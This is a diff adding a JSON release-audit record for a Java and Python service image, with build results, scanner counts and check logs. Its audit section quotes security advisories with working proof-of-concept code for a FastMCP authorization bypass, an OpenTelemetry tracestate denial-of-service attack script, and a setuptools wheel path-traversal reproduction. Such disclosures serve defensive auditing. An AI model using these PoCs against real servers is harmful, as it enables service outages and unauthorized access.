@@ -1,0 +1,912 @@
+{
+  "application": {
+    "application_requests": {
+      "create_response": {
+        "accountId": "ACCT-IMG-01",
+        "balance": 1250.0,
+        "currencyCode": "USD",
+        "customerId": "CUST-IMG-01",
+        "openedAt": "2026-01-15",
+        "status": "OPEN"
+      },
+      "create_status": 201,
+      "missing_id_status": 404,
+      "read_response": {
+        "accountId": "ACCT-IMG-01",
+        "balance": 1250.0,
+        "currencyCode": "USD",
+        "customerId": "CUST-IMG-01",
+        "openedAt": "2026-01-15",
+        "status": "OPEN"
+      },
+      "read_status": 200,
+      "request": {
+        "accountId": "ACCT-IMG-01",
+        "balance": 1250.0,
+        "currencyCode": "USD",
+        "customerId": "CUST-IMG-01",
+        "openedAt": "2026-01-15",
+        "status": "OPEN"
+      }
+    },
+    "build_command": [
+      "mvn",
+      "clean",
+      "package",
+      "-DskipTests"
+    ],
+    "cache_writable": true,
+    "health": {
+      "groups": [
+        "liveness",
+        "readiness"
+      ],
+      "status": "UP"
+    },
+    "health_http_status": 200,
+    "jar_built": true,
+    "jobless": false,
+    "ka_enabled": false,
+    "maven_test_reports": [
+      {
+        "name": "TEST-com.appbuilder.account_servicing.AccountServicingApplicationTest.xml",
+        "sha256": "ba02f224a11479f5f7ddb706f56c7c303fb9b64a1ab44f61f20994b8de424ba2"
+      }
+    ],
+    "maven_tests": {
+      "errors": 0,
+      "failures": 0,
+      "skipped": 0,
+      "tests": 1
+    },
+    "profile": "springboot-legacy-compatible",
+    "python_optimization": 0,
+    "result": "pass",
+    "uid": 1000
+  },
+  "assessment": {
+    "applied_rules": [
+      {
+        "match-type": "exact-indirect-match",
+        "namespace": "",
+        "package": {
+          "language": "",
+          "name": "linux-libc-dev",
+          "type": "deb",
+          "upstream-name": "linux"
+        }
+      }
+    ],
+    "counts": {
+      "grype_active": 1050,
+      "grype_ignored": 1883,
+      "trivy_debian": 2938,
+      "trivy_python": 8
+    },
+    "groups": 2948,
+    "grype_severity": {
+      "Critical": 23,
+      "High": 146,
+      "Low": 23,
+      "Medium": 138,
+      "Negligible": 687,
+      "Unknown": 33
+    },
+    "inventory": {
+      "copied_jdk": {
+        "name": "openjdk",
+        "version": "21.0.12.1+1-LTS"
+      },
+      "debian_packages": 166,
+      "java_archives": 52,
+      "python_packages": 106,
+      "trivy_imported_python_sbom_records": 18
+    },
+    "observations": 5879,
+    "python_open": [
+      {
+        "advisories": 1,
+        "advisory_fingerprint_sha256": "db4ba8ace49a2a1433a0630ff84c105a23dd7a2060704d0558300fb172c44473",
+        "available_fixes": {
+          "GHSA-6q48-6c7w-9gw2": "2026.10.19"
+        },
+        "category": "inventory_unresolved_python",
+        "disposition": "open; standalone distribution absent, embedded-code applicability unresolved",
+        "high_critical_ids": [
+          "GHSA-6q48-6c7w-9gw2"
+        ],
+        "name": "certifi",
+        "scope": "Studio Python runtime",
+        "severities": {
+          "CRITICAL": 1
+        },
+        "version": "2026.6.17"
+      },
+      {
+        "advisories": 1,
+        "advisory_fingerprint_sha256": "9459a7c5ea9feba5a029239a12869d4b0478b4c33718804074b1e56eed07dcd4",
+        "available_fixes": {
+          "GHSA-6v7p-g79w-8964": "1.2.1"
+        },
+        "category": "inventory_unresolved_python",
+        "disposition": "open; standalone distribution absent, embedded-code applicability unresolved",
+        "high_critical_ids": [
+          "GHSA-6v7p-g79w-8964"
+        ],
+        "name": "msgpack",
+        "scope": "Studio Python runtime",
+        "severities": {
+          "HIGH": 1
+        },
+        "version": "1.1.2"
+      },
+      {
+        "advisories": 3,
+        "advisory_fingerprint_sha256": "87829d7bb8994b800f9a40d61b60e0c9d4756b66fb55d9d2cb7cc26a06461440",
+        "available_fixes": {
+          "CVE-2025-47273": "78.1.1",
+          "CVE-2026-59890": "83.0.0",
+          "GHSA-xmj3-9gf7-h52w": "84.1.0"
+        },
+        "category": "inventory_unresolved_python",
+        "disposition": "open; standalone distribution absent, embedded-code applicability unresolved",
+        "high_critical_ids": [
+          "CVE-2025-47273"
+        ],
+        "name": "setuptools",
+        "scope": "Studio Python runtime",
+        "severities": {
+          "HIGH": 1,
+          "LOW": 1,
+          "MEDIUM": 1
+        },
+        "version": "70.3.0"
+      },
+      {
+        "advisories": 3,
+        "advisory_fingerprint_sha256": "55ace078131ad0838777ad20be49c94f1fbb2fc0b68b8520c200a07bd2e2af22",
+        "available_fixes": {
+          "CVE-2026-97687": "2.8.0",
+          "CVE-2026-97688": "2.8.0",
+          "CVE-2026-97689": "2.8.0"
+        },
+        "category": "inventory_unresolved_python",
+        "disposition": "open; standalone distribution absent, embedded-code applicability unresolved",
+        "high_critical_ids": [
+          "CVE-2026-97687",
+          "CVE-2026-97689"
+        ],
+        "name": "urllib3",
+        "scope": "Studio Python runtime",
+        "severities": {
+          "HIGH": 2,
+          "MEDIUM": 1
+        },
+        "version": "2.7.0"
+      }
+    ],
+    "state": "complete-with-findings",
+    "trivy_types": [
+      "debian",
+      "jar",
+      "python-pkg"
+    ]
+  },
+  "authority": "Maintainer-approved EF-V5-RELEASE-SCOPE-RESET revision 3; private preparation, not release authorization",
+  "base_descriptors": {
+    "jdk": {
+      "index_digest": "sha256:3e3c176ffed168beb42c607be9bc1639b466cf00261a0fb04425562c9d0c5c2b",
+      "linux_amd64": [
+        {
+          "annotations": {
+            "com.docker.official-images.bashbrew.arch": "amd64",
+            "org.opencontainers.image.base.digest": "sha256:88a381d5b5eeb2b35d3ad70925a362c37ce569daf43ede89ff818ec20e4d3794",
+            "org.opencontainers.image.base.name": "ubuntu:26.04",
+            "org.opencontainers.image.created": "2026-10-02T01:18:30Z",
+            "org.opencontainers.image.revision": "511f9356dc4d50932a0a5f8cfb0f87ed1aef4f07",
+            "org.opencontainers.image.source": "https://github.com/adoptium/containers.git#511f9356dc4d50932a0a5f8cfb0f87ed1aef4f07:21/jdk/ubuntu/resolute",
+            "org.opencontainers.image.url": "https://hub.docker.com/_/eclipse-temurin",
+            "org.opencontainers.image.version": "21.0.12.1_1-jdk-resolute"
+          },
+          "digest": "sha256:442a743d9272be15c9872915eab0f7a1b6bb45b7c16c613acf172e2d7483061d",
+          "mediaType": "application/vnd.oci.image.manifest.v1+json",
+          "platform": {
+            "architecture": "amd64",
+            "os": "linux"
+          },
+          "size": 2137
+        }
+      ]
+    },
+    "python": {
+      "index_digest": "sha256:a1165e272e578941b84abc79e4ab38a0305cd12803a5c4247979ac7655f4d641",
+      "linux_amd64": [
+        {
+          "annotations": {
+            "com.docker.official-images.bashbrew.arch": "amd64",
+            "org.opencontainers.image.base.digest": "sha256:a4672c0cb26fbdde88e38fa2dfb6c681942306680e41e4378b28770b6e79ee91",
+            "org.opencontainers.image.base.name": "debian:bookworm-slim",
+            "org.opencontainers.image.created": "2026-10-06T01:55:45Z",
+            "org.opencontainers.image.revision": "d2a898cb88e46203577eabc62cdcf6e92aaee176",
+            "org.opencontainers.image.source": "https://github.com/docker-library/python.git#d2a898cb88e46203577eabc62cdcf6e92aaee176:3.13/slim-bookworm",
+            "org.opencontainers.image.url": "https://hub.docker.com/_/python",
+            "org.opencontainers.image.version": "3.13.16-slim-bookworm"
+          },
+          "digest": "sha256:f040863673aea2570c3ff6a5c3fb4c673a016cbc5375005ad145915922b6b78a",
+          "mediaType": "application/vnd.oci.image.manifest.v1+json",
+          "platform": {
+            "architecture": "amd64",
+            "os": "linux"
+          },
+          "size": 1752
+        }
+      ]
+    }
+  },
+  "base_studio_sha": "74e065a95f0b129fcfd55fbea74412d6634cf17e",
+  "baseline_audit": {
+    "exit_code": 1,
+    "observations": [
+      {
+        "name": "fastmcp",
+        "version": "3.4.0",
+        "vulns": [
+          {
+            "aliases": [],
+            "description": "## Maintainer assessment and remediation  This report is accepted as a FastMCP authorization vulnerability. In supported configurations, a server transform can change the metadata used by a component's authorization policy. Direct lookups previously checked the original component but returned the transformed component without rechecking its policy. A client that knows the component identifier can invoke a tool or retrieve a resource or prompt that the configured policy denies.  The fixes authorize the final transformed tools, resources, templates, and prompts. A denied concrete resource also shadows a matching resource template at its URI, preventing proxy templates from retrieving the same protected resource upstream. Authorized callers, authorized component versions, and templates for genuinely absent concrete resources remain supported.  Affected stable release lines: FastMCP 3.0.0\u20133.4.9 and 4.0.0\u20134.1.1. The missing final authorization check is present in v3.0.0 history and was reproduced on v3.4.9 and v4.1.0. Both `fastmcp` and `fastmcp-slim` installations are affected when using component authorization with transforms or protected concrete resources overlapping proxy templates.  Fixes are available in FastMCP 3.4.10 and 4.1.2. Until upgrading, avoid overlapping proxy templates for protected resources and enforce the required authorization at the handler or server boundary rather than relying on a policy whose inputs are changed by a transform.  ## Original report  # Post-transform component authorization is skipped on direct calls  ## Summary  FastMCP's direct component paths can return a transformed component before its applicable `AuthCheck`, allowing low-privilege callers to execute hidden protected behavior. I reproduced this against FastMCP 4.1.0 and commit `e2fcc412001ff7414095c5dc282f94c70299a612` using only an in-process FastMCP server. The attacker does not have server-side access and does not control FastMCP configuration.  ## Details  ### Attacker prerequisites  A server uses a supported provider, server, or session transform and a metadata-aware component `AuthCheck`. The attacker has a valid low-privilege identity, lacks the required scope, and knows or guesses the final transformed component name. They do not control the transform or the policy.  ### Root cause  Listing applies transforms and then authorizes the transformed component. In the direct lookup path, FastMCP 4.1.0 applies the transform and returns the component without authorizing that final component. See [`server.py:933-940`](https://github.com/PrefectHQ/fastmcp/blob/v4.1.0/fastmcp_slim/fastmcp/server/server.py#L933-L940). The MCP `tools/call` handler reaches this path; equivalent direct paths exist for resources, templates, and prompts.  ## Proof of concept  Save this as `poc_transform_auth.py`:  ```python import anyio  from fastmcp import FastMCP from fastmcp.server.auth import restrict_tag from fastmcp.server.transforms.tool_transform import ToolTransform from fastmcp.tools.base import Tool from fastmcp.tools.tool_transform import ToolTransformConfig   async def main() -> None:     server = FastMCP(\"auth-boundary\")     server.add_tool(         Tool.from_function(             lambda: \"PROTECTED SECRET\",             name=\"tagged_tool\",             tags={\"public\"},             auth=restrict_tag(\"admin\", scopes=[\"admin\"]),         )     )     server.add_transform(         ToolTransform({\"tagged_tool\": ToolTransformConfig(tags={\"admin\"})})     )      print(\"listed:\", [tool.name for tool in await server.list_tools()])     try:         result = await server.call_tool(\"tagged_tool\")     except Exception as exc:         print(\"BLOCKED:\", type(exc).__name__)     else:         print(\"VULNERABLE: direct call returned\", result.content[0].text)   anyio.run(main) ```  Run it in an isolated environment:  ```bash uv run --with fastmcp==4.1.0 -- python poc_transform_auth.py ```  Observed on 4.1.0 for a caller without the `admin` scope:  ```text listed: [] VULNERABLE: direct call returned PROTECTED SECRET ```  ## Impact  A low-privilege caller can directly execute administrative tools hidden from listing, including their side effects and returned secrets. The same ordering flaw can expose protected resources, templates, or prompts.  ### Recommended remediation  Apply component authorization to the final transformed component in every direct resolution/execution path, after all provider, server, and session transforms. Reuse one ordered resolver for list and direct operations so lookup never returns a transformed component before its applicable `AuthCheck` runs.  ## AI assistance  Yes \u2014 OpenAI Codex assisted static analysis/PoC/writeup; reproduction was validated against stated version.",
+            "fix_versions": [
+              "3.4.10",
+              "4.1.2"
+            ],
+            "id": "GHSA-7xgj-8392-5q4r"
+          }
+        ]
+      },
+      {
+        "name": "opentelemetry-api",
+        "version": "1.43.0",
+        "vulns": [
+          {
+            "aliases": [
+              "CVE-2026-114603"
+            ],
+            "description": "## Summary `TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N\u00b2) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.  ## Affected component / version - Package: `opentelemetry-api` (pip) \u2014 `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`). - Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between. - Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.  ## Details  1. The header reaches the parser without any length check:  ```python # opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57 tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size if tracestate_headers is None:     tracestate = None else:     tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61) ```  2. The split pattern and the parser: ```python # opentelemetry-api/src/opentelemetry/trace/span.py:45 _TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split _delimiter_pattern = re.compile(r\"[ \\t]*,[ \\t]*\")      # <-- (line 46) starts with an unbounded [ \\t]*  # span.py:382 @classmethod def from_header(cls, header_list: list[str]) -> TraceState:     pairs = {}  # type: dict[str, str]     for header in header_list:         members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on \"a=b\" + \" \" * N + \"x\"         for member in members:             if not member:                 continue             match = _member_pattern.fullmatch(member)             if not match:                 _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)                     \"Member doesn't match the w3c identifiers format %s\",                     member,                 )                 return cls()             ... ```  `re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ \\t]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters \u00d7 up to N steps each = O(N\u00b2). The 32-member limit never gets a chance to run because `split` has to finish first.  3. The sibling propagator already has the missing guard: ```python # baggage/propagation/__init__.py:68 _MAX_HEADER_LENGTH = 8192 ... if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent     _logger.warning(...)     return context ```  A 16 KiB header costs \u2248 0.25 s and an 8 KiB header \u2248 0.07 s. Measured cost of `extract()` on one core (valid `traceparent`, `tracestate: \"a=b\" + N spaces + \"x\"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6\u00d7 slower).   Whether a server lets such a header through (header-size limits, tested): gunicorn rejects \u2265 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` \u2014 the default parser with `uvicorn[standard]` \u2014 accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.  ## Proof of concept  ### A. Show the quadratic cost (no server needed)  1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected). 2. Save as `poc_tracestate.py`: ```python import logging import time  from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator  # The library logs the whole malformed member at WARNING; silence it so the timings stay readable. logging.disable(logging.CRITICAL)  TRACEPARENT = \"00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01\" propagator = TraceContextTextMapPropagator()  previous = None for n in (10_000, 20_000, 40_000, 80_000):     # N spaces after a valid member, no comma anywhere in the header     carrier = {\"traceparent\": TRACEPARENT, \"tracestate\": \"a=b\" + \" \" * n + \"x\"}     start = time.perf_counter()     propagator.extract(carrier)     elapsed = time.perf_counter() - start     growth = f\"x{elapsed / previous:.1f}\" if previous else \"-\"     print(f\"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}\")     previous = elapsed ``` 3. Run `python poc_tracestate.py`. 4. **What to observe:** the time grows by about **\u00d74 every time the input size doubles** (a linear parser would show \u00d72). Absolute numbers depend on the CPU; the growth factor does not. Our run: ```   10000 characters    0.06 s  growth when size doubles: -   20000 characters    0.26 s  growth when size doubles: x4.0   40000 characters    1.04 s  growth when size doubles: x4.0   80000 characters    4.13 s  growth when size doubles: x4.0 ``` Replace `\" \"` with `\"\\t\"` to see \u22481.6\u00d7 longer.  ### B. Show that one request stalls a real server This uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).  1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi \"uvicorn[standard]\"`. 2. Save as `app.py`: ```python from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware   async def app(scope, receive, send):     await send({\"type\": \"http.response.start\", \"status\": 200, \"headers\": [(b\"content-type\", b\"text/plain\")]})     await send({\"type\": \"http.response.body\", \"body\": b\"ok\"})   app = OpenTelemetryMiddleware(app) ``` 3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools` 4. Save as `attack.py`: ```python \"\"\"Send one oversized tracestate request and, while it is being handled, measure how long an unrelated request to the same server has to wait.\"\"\" import socket import sys import threading import time  HOST, PORT = \"127.0.0.1\", 8000 N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000 TRACEPARENT = \"00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01\"   def get(path, extra=\"\"):     s = socket.create_connection((HOST, PORT), timeout=120)     s.sendall(f\"GET {path} HTTP/1.1\\r\\nHost: x\\r\\nConnection: close\\r\\n{extra}\\r\\n\".encode())     start, data = time.perf_counter(), b\"\"     while chunk := s.recv(65536):         data += chunk     return time.perf_counter() - start, data.split(b\"\\r\\n\")[0].decode()   result = {} extra = f\"traceparent: {TRACEPARENT}\\r\\ntracestate: a=b{' ' * N}x\\r\\n\" attacker = threading.Thread(target=lambda: result.update(a=get(\"/attack\", extra))) print(\"idle /ping:               %.3f s  %s\" % get(\"/ping\")) attacker.start() time.sleep(0.5)  # let the attack request reach the server first print(\"/ping during the attack:  %.3f s  %s\" % get(\"/ping\")) attacker.join() print(\"attack request itself:    %.3f s  %s\" % result[\"a\"]) ``` 5. In a second terminal run `python attack.py 100000`. 6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run: ``` idle /ping:               0.000 s  HTTP/1.1 200 OK /ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked) attack request itself:    6.408 s  HTTP/1.1 200 OK ``` 7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces \u2192 0.59 s; 100,000 spaces \u2192 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs \u2192 12.39 s with the concurrent `/ping` delayed 11.89 s.  ## Severity **Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16\u201330 KB.  **Impact: Medium.** One request of about 100 KB costs 6\u201312 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.  **Severity: Medium.**  ## Suggested remediation Replace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input: ```diff --- a/opentelemetry-api/src/opentelemetry/trace/span.py +++ b/opentelemetry-api/src/opentelemetry/trace/span.py @@ def from_header(cls, header_list: list[str]) -> TraceState:          for header in header_list: -            members: list[str] = re.split(_delimiter_pattern, header) +            members: list[str] = [m.strip(\" \\t\") for m in header.split(\",\")] ``` `_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.  ## Credit  Discovered and reported by SecDim Security Research secdim.com | @secdim | security@secdim.com  ---  **FROM MAINTAINERS**  ## Summary  `TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.  Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.  ## Impact  Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.  The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.  Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.  The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.  ## Patches  Versions of `opentelemetry-api` up to and including `1.45.0` are affected.  Upgrade `opentelemetry-api` to version `1.45.1` or later.  Version `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.  ## Workarounds  Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.",
+            "fix_versions": [
+              "1.45.1"
+            ],
+            "id": "GHSA-xcq7-p3pf-p88h"
+          }
+        ]
+      },
+      {
+        "name": "setuptools",
+        "version": "83.0.0",
+        "vulns": [
+          {
+            "aliases": [],
+            "description": "### Summary  On Windows, attacker-controlled content in a wheel's `.dist-info/namespace_packages.txt` can cause setuptools' legacy wheel installation path to create an `__init__.py` outside the requested `destination_eggdir`.  The attacker can influence the destination path, but not the contents of the created file.  ### Details  Tested setuptools commit:  `6ead555c5fb29bc57fe6105b1bffc163f56fd558`  Relevant source:  `setuptools/wheel.py`  SHA-256:  `359b7e0d5dd8c3135653abe08a8ed5dc0352eadfd7df22cb5e2b5303b7c3cafd`  The relevant call path is:  `Wheel(wheel_path).install_as_egg(destination)` \u2192 `_install_as_egg` \u2192 `_convert_metadata` \u2192 `_fix_namespace_packages`  A wheel can provide attacker-controlled content in:  `<distribution>.dist-info/namespace_packages.txt`  The namespace value is eventually used approximately as:  ```python mod_dir = os.path.join(destination_eggdir, *mod.split('.')) mod_init = os.path.join(mod_dir, '__init__.py')  If mod is a Windows drive-qualified absolute path containing no dots, mod.split('.') preserves it as a single component. On Windows, os.path.join(destination_eggdir, absolute_component) discards the original base directory and resolves to the attacker-supplied absolute path. The existing wheel filename and ZIP traversal checks do not validate this metadata value before it is subsequently interpreted as a filesystem path.  ```markdown ### PoC  The reproduction was performed entirely inside a disposable temporary directory.  Layout:  ```text sandbox/     destination/     outside/     input/     canary.txt ```  A synthetic wheel was created containing:  `demo_pkg-1.0.dist-info/namespace_packages.txt`  whose content was the absolute path of:  `sandbox\\outside`  The real acquired setuptools implementation was then invoked:  ```python setuptools.wheel.Wheel(synthetic_wheel).install_as_egg(     sandbox_destination ) ```  The operation completed without exception.  Expected metadata was created under:  `sandbox\\destination\\EGG-INFO`  but setuptools also created:  `sandbox\\outside\\__init__.py`  The file did not exist before execution.  Its contents were:  ```python __import__('pkg_resources').declare_namespace(__name__) ```  The unrelated canary remained byte-identical.  The sandbox was deleted after recording the evidence. ```   ### Impact  A crafted wheel can cause setuptools to create a fixed-content `__init__.py` outside the intended installation directory at a filesystem path influenced by the wheel, with the permissions of the process performing the installation.  The demonstrated reproduction required the target parent directory to already exist.",
+            "fix_versions": [
+              "84.1.0"
+            ],
+            "id": "GHSA-xmj3-9gf7-h52w"
+          }
+        ]
+      }
+    ],
+    "packages": 95
+  },
+  "bootstrap": {
+    "built_wheel_sha256": "fa78c5df301be0a816bd2fa63811fb724fdc0673a5ffea0d72b702fc0e811d00",
+    "explicit_toolchain": {
+      "packaging": "26.2",
+      "pip": "26.2.1",
+      "setuptools": "84.1.0",
+      "wheel": "0.48.0"
+    },
+    "python": "3.13.16 (main, Oct  6 2026, 02:04:05) [GCC 12.2.0]",
+    "result": "pass",
+    "seed": {
+      "pip": "26.2.1"
+    },
+    "uid": 1000,
+    "wheelhouse_sha256": {
+      "packaging-26.2-py3-none-any.whl": "5fc45236b9446107ff2415ce77c807cee2862cb6fac22b8a73826d0693b0980e",
+      "pip-26.2.1-py3-none-any.whl": "71138adf1f4ca900cdb7d289c21b7494329f2332b6d85f0e1c42108c0384ed3e",
+      "setuptools-84.1.0-py3-none-any.whl": "5231689c6ac8156cd155cfb98c3fd6fb252c3e7e9bd3d78b64d3c55f132624c9",
+      "wheel-0.48.0-py3-none-any.whl": "3217dcc807155e45db462d7ef2431f5ddda0d7273b700d05a67b271ceb1287ab"
+    }
+  },
+  "candidate": "EF-V5-SOURCE-PREP-STUDIO-S1 revision 1",
+  "checks": {
+    "content-secret-check": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:34:25.275385+00:00",
+      "log": "content-secret-check.log",
+      "log_sha256": "9668a43c217c12cdc9a280bd66a5ebbc6e2ec6e5b7e54c271793808dbec7cd94",
+      "started_utc": "2026-10-26T02:34:23.745552+00:00"
+    },
+    "final-grype": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:23:42.021310+00:00",
+      "log": "final-grype.log",
+      "log_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "started_utc": "2026-10-26T02:23:37.763304+00:00"
+    },
+    "final-syft": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:22:07.200010+00:00",
+      "log": "final-syft.log",
+      "log_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "started_utc": "2026-10-26T02:22:00.568241+00:00"
+    },
+    "final-trivy": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:22:08.737246+00:00",
+      "log": "final-trivy.log",
+      "log_sha256": "b3d36a798cbc4c2fd7a8554476c21942c42a66ee2c95011ccfa5b443aaefd5e6",
+      "started_utc": "2026-10-26T02:22:03.467727+00:00"
+    },
+    "image-bootstrap-offline": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:27:18.968962+00:00",
+      "log": "image-bootstrap-offline.log",
+      "log_sha256": "b191a1318923ffce5aa3dadc37a2a727822b0211573fcfcfc9d6dac7f25ff6ca",
+      "started_utc": "2026-10-26T02:27:13.527273+00:00"
+    },
+    "image-build": {
+      "exit_code": 130,
+      "finished_utc": "2026-10-26T02:20:00.250996+00:00",
+      "log": "image-build.log",
+      "log_sha256": "5d172b943f626b241104152a5bb4f52a996035d5440f5ccbc0704cc06620f82d",
+      "started_utc": "2026-10-26T02:16:54.802061+00:00"
+    },
+    "image-build-corrected": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:21:08.477359+00:00",
+      "log": "image-build-corrected.log",
+      "log_sha256": "d003c2bf513c6151249ae054ee02e6c6c8beed400051d8926bf7be1bfb530055",
+      "started_utc": "2026-10-26T02:20:02.897040+00:00"
+    },
+    "image-build-run": {
+      "exit_code": 1,
+      "finished_utc": "2026-10-26T02:23:50.161000+00:00",
+      "log": "image-build-run.log",
+      "log_sha256": "e18956cae9b78e6e92cd884d76f5d8dab3533065da64f7e451e6aba5d85b6b01",
+      "started_utc": "2026-10-26T02:23:48.176711+00:00"
+    },
+    "image-build-run-allowed-root": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:25:59.203333+00:00",
+      "log": "image-build-run-allowed-root.log",
+      "log_sha256": "7657fc92fc50d9f6eb75f8482df4d235eb5f085c701e499f186ed1369f247cb1",
+      "started_utc": "2026-10-26T02:25:00.210023+00:00"
+    },
+    "image-launch": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:22:04.738486+00:00",
+      "log": "image-launch.log",
+      "log_sha256": "89cdf16492835070efaafecc0f271e1ab496ab0abd66d00cf97ee9fd2f427ae9",
+      "started_utc": "2026-10-26T02:21:56.840012+00:00"
+    },
+    "image-oci": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:25:05.116378+00:00",
+      "log": "image-oci.log",
+      "log_sha256": "3dcd187ef95ba77d5333e1580a4ef8547f840303251ce78040803e38ab1e35e6",
+      "started_utc": "2026-10-26T02:25:03.586694+00:00"
+    },
+    "image-pip-check": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:25:57.016777+00:00",
+      "log": "image-pip-check.log",
+      "log_sha256": "9261363b733079a641c2e4cc9bc46ffa1d8336945a87f807b6cf68847dbc9b09",
+      "started_utc": "2026-10-26T02:25:56.237993+00:00"
+    },
+    "image-probe": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:23:25.675829+00:00",
+      "log": "image-probe.log",
+      "log_sha256": "cd5c042c85546054029539ecf407c203ba18451d086062ff7c2118a76d503ab8",
+      "started_utc": "2026-10-26T02:23:24.413488+00:00"
+    },
+    "image-save": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:23:16.184089+00:00",
+      "log": "image-save.log",
+      "log_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "started_utc": "2026-10-26T02:23:13.655155+00:00"
+    },
+    "image-sdk-caller-ka-supported-paths": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:30:52.762808+00:00",
+      "log": "image-sdk-caller-ka-supported-paths.log",
+      "log_sha256": "ed54747e3ad5ff02198958ea3e1eb52efda2bb4c1c39981ba95f38d5de1ccc08",
+      "started_utc": "2026-10-26T02:30:49.416211+00:00"
+    },
+    "image-sdk-caller-ka-tests": {
+      "exit_code": 1,
+      "finished_utc": "2026-10-26T02:30:28.987193+00:00",
+      "log": "image-sdk-caller-ka-tests.log",
+      "log_sha256": "31d43f82ad216b89b505e08811f8323c5188279a15e9810ddf5c9cbef4b00364",
+      "started_utc": "2026-10-26T02:30:25.424803+00:00"
+    },
+    "image-strict-audit": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:31:11.679947+00:00",
+      "log": "image-strict-audit.log",
